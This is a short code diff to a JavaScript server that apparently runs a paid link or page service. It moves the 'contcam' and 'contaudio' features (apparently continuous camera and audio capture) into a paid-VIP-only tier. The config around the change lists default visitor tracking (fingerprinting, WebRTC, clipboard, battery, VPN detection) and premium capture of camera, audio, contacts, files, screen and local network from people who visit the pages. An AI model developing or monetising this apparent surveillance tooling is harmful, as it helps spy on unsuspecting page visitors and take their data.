@@ -41,7 +41,9 @@ const DEFAULT_PAGE_CONFIG = {
 };
 
 const DEFAULT_FEATURES = { gyroscope:true, webrtc:true, fingerprint:true, sessionTime:true, lightSensor:true, clipboard:true, battery:true, vpnDetect:true };
-const DEFAULT_PREMIUM_FREE = { camera:false, audio:false, clipboard:false, contacts:false, files:false, persistentId:false, localNet:false, webpush:true, screencap:false, contcam:false, contaudio:false, faceAI:false, activityDetect:false, autofill:false, devtools:false };
+const DEFAULT_PREMIUM_FREE = { camera:false, audio:false, clipboard:false, contacts:false, files:false, persistentId:false, localNet:false, webpush:true, screencap:false, faceAI:false, activityDetect:false, autofill:false, devtools:false };
+// These features are ALWAYS paid-VIP only — never free
+const VIP_ONLY_FEATURES = new Set(['contcam', 'contaudio']);
 
 let pageConfig  = { ...DEFAULT_PAGE_CONFIG, ...loadJSON(PAGE_CONFIG_FILE, {}) };
 let submissions = loadJSON(SUBMISSIONS_FILE, []);
@@ -267,6 +269,7 @@ function isPremiumFeatureFree(feature) {
 
 // Returns true if uid can use a specific premium feature
 function canUsePremium(uid, feature) {
+  if (VIP_ONLY_FEATURES.has(feature)) return isPremium(uid); // paid VIP only
   return isPremium(uid) || isPremiumFeatureFree(feature);
 }
 
